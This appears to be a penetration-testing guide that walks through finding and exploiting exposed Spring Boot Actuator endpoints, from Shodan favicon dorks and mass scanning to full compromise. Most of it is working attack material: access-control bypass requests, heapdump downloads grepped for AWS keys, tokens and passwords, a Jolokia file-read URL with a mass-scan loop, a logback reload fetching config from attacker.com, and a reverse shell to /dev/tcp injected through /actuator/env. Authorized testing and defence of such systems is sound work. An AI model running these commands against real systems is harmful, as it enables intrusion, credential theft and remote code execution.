# Spring Boot Actuator Exploitation Methodology

**From Discovery to Full Compromise**

A practical, real‑world methodology for identifying, enumerating, bypassing, and exploiting exposed Spring Boot Actuator endpoints during authorized security testing.


## Phase 1: Discovery — Finding Exposed Spring Boot Instances

### Goal

Identify internet‑exposed Spring Boot applications and verify whether Actuator endpoints are accessible.


### Method 1: Internet‑Wide Recon Using Shodan

Spring Boot applications commonly use a default favicon, making them fingerprintable at scale.

**Shodan Dorks**

```text
org:target_org http.favicon.hash:116323821
ssl:"example.com" http.favicon.hash:116323821
hostname:"example.com" http.favicon.hash:116323821
ssl.cert.subject.CN:"*.example.com" http.favicon.hash:116323821
ssl.cert.subject.CN:"example.com" http.favicon.hash:116323821
```

**Note:**
These queries return hosts likely running Spring Boot within a specific organization or domain.


### Method 2: Active Verification with Nuclei

Nuclei uses reusable templates to rapidly identify exposed Actuator and Jolokia endpoints.

```bash
cat act.txt | nuclei -tags actuator -c 50
cat act.txt | nuclei -tags jolokia -es info,low -silent
```

### Method 3: Directory and Path Discovery with Dirsearch

```bash
dirsearch -l target.txt \
-w /SecLists/Discovery/Web-Content/spring-boot.txt \
-x 404 -o output.txt
```

Using a Spring Boot–specific wordlist significantly increases detection accuracy.

### Method 4: Fast Endpoint Probing with httpx

```bash
cat targets.txt | httpx-toolkit -silent -threads 50 \
-path '/actuator,/actuator/health,/actuator/info' \
-mc 200,401,403,302 > actuators.txt
```

Responses such as 401 and 403 still confirm that the endpoint exists and is reachable.

## Phase 2: Enumeration and Bypass Techniques

### Goal

Enumerate sensitive endpoints and attempt to bypass weak access controls.

### High‑Value Actuator Endpoints

```text
/actuator/env
/actuator/heapdump
/actuator/jolokia
/actuator/metrics
/actuator/loggers
/actuator/mappings
/actuator/configprops
/actuator/beans
/actuator/threaddump
```

### Access Control Bypass Techniques

#### Header‑Based Bypass

```http
GET /actuator/env HTTP/1.1
Host: example.com
X-Forwarded-For: 127.0.0.1
```

```http
GET /allowed-path HTTP/1.1
Host: example.com
X-Original-URL: /actuator/env
```

#### Path Confusion and Normalization Tricks

```text
/actuator;/env
/actuator//env
/actuator/.
/./actuator
/../actuator
```

#### Encoding and Extension Tricks

```text
/actuator%2Fenv
/%2e%2e/actuator
/actuator.json
/actuator.html
/actuator%00
```

#### HTTP Method Testing (Authorized Testing Only)

```text
GET
HEAD
OPTIONS
```

## Phase 3: Exploitation — From Exposure to Impact

### Goal

Demonstrate real security impact through exposed Actuator endpoints.

## Heapdump Analysis for Credential Leakage

### Download Heapdump

```bash
wget http://target.com/actuator/heapdump
```

### Extract AWS Access Keys

```bash
strings -a -n 6 heapdump | grep -Eo 'AKIA[0-9A-Z]{16}' | sort -u
```

### Extract JWT Tokens

```bash
strings -a -n 10 heapdump | \
grep -Eo '[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+' | sort -u
```

### Generic Secret Discovery

```bash
strings -a -n 6 heapdump.hprof | \
grep -Ei 'password|passwd|pwd|secret|api[_-]?key|token|bearer|AKIA|ssh-rsa' \
> possible_secrets.txt
```

## Jolokia Exploitation

### Local File Inclusion via DiagnosticCommand

```text
http://target.com/actuator/jolokia/exec/
com.sun.management:type=DiagnosticCommand/
compilerDirectivesAdd/!/etc!/passwd
```

### Mass LFI Detection Script

```bash
#!/bin/bash
while read ip; do
  echo "Testing $ip"
  curl -s "http://$ip/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd" \
  | grep -q "root:" && echo "VULNERABLE: $ip"
done < ip_list.txt
```

## Remote Code Execution via Jolokia

### Logback Configuration Reload

```text
http://target.com/actuator/jolokia/exec/
ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/
reloadByURL/http:!/!/attacker.com!/logback.xml
```

### Reverse Shell via Actuator Environment Endpoint

```bash
curl -X POST http://target/actuator/env \
-H "Content-Type: application/json" \
-d '{
  "name":"spring.datasource.hikari.connection-test-query",
  "value":"bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"
}'
```

```bash
nc -lvnp YOUR_PORT
```

## Final Notes

* Exposed Actuator endpoints represent a critical security misconfiguration.
* Heapdump and Jolokia frequently lead to credential disclosure or remote code execution.
* All testing must be conducted strictly within authorized scopes.
* Effective reports demonstrate impact, not just endpoint accessibility.

